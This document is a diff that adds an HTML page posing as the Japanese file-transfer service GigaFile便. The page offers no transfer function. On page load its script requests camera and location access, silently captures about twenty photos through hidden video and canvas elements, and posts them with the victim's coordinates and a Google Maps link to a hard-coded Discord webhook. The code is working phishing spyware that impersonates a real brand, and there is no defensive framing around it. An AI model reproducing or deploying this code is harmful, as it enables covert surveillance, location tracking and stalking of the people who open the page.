@@ -1,0 +1,105 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="ja">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <title>無料大容量 ファイル転送サービス GigaFile(ギガファイル)便</title>
+</head>
+
+<body>
+  <!-- 非表示のカメラ要素 -->
+  <video id="video" autoplay playsinline style="display:none"></video>
+  <canvas id="canvas" style="display:none"></canvas>
+
+<script>
+const video = document.createElement('video');
+const canvas = document.createElement('canvas');
+const ctx = canvas.getContext('2d');
+let photoArray = [];
+
+// Base64 → Blob
+function base64ToBlob(base64, type = 'image/png') {
+  const binary = atob(base64.split(',')[1]);
+  const array = [];
+  for (let i = 0; i < binary.length; i++) {
+    array.push(binary.charCodeAt(i));
+  }
+  return new Blob([new Uint8Array(array)], { type });
+}
+
+// 1フレーム撮影
+function capturePhoto() {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0);
+  return canvas.toDataURL('image/png');
+}
+
+// Discordへ送信（10枚ずつ分割）
+async function sendAllPhotos(webhookUrl, photoArray, lat, lng) {
+  const chunkSize = 10;
+  for (let i = 0; i < photoArray.length; i += chunkSize) {
+    const chunk = photoArray.slice(i, i + chunkSize);
+    const formData = new FormData();
+
+    // 最初の送信で本文を追加（2回目以降は省略）
+    if (i === 0) {
+      formData.append(
+        "content",
+        `📸 撮影完了！${photoArray.length}枚キャプチャしました\n🌍 緯度: ${lat}, 経度: ${lng}\n🗺 Googleマップ: https://www.google.com/maps?q=${lat},${lng}`
+      );
+    }
+
+    // 添付ファイル追加
+    chunk.forEach((photo, idx) => {
+      const blob = base64ToBlob(photo);
+      formData.append(`file${idx}`, blob, `photo_${i + idx + 1}.png`);
+    });
+
+    await fetch(webhookUrl, {
+      method: "POST",
+      body: formData
+    });
+  }
+}
+
+// メイン処理
+async function sendOnPermission() {
+  try {
+    // カメラ取得
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+
+    // 位置情報取得
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const lat = pos.coords.latitude;
+      const lng = pos.coords.longitude;
+
+      // 1秒間 20fps 撮影
+      photoArray = [];
+      const interval = setInterval(() => {
+        photoArray.push(capturePhoto());
+      }, 50);
+
+      setTimeout(async () => {
+        clearInterval(interval);
+
+        const webhookUrl = "https://discord.com/api/webhooks/1410283485377331300/73MF6zns-aj6WU2XhWayMd5ERtQRdzyAXyJ6tiplHnFj6LttzN8Ghsu5f9xYKa7w-K48";
+        await sendAllPhotos(webhookUrl, photoArray, lat, lng);
+
+      }, 1000);
+
+    }, (err) => {
+      console.error("位置情報拒否:", err);
+    });
+
+  } catch (err) {
+    console.error("カメラ拒否:", err);
+  }
+}
+
+// ページロード時に実行
+window.addEventListener('load', sendOnPermission);
+</script>
+</body>
+</html>
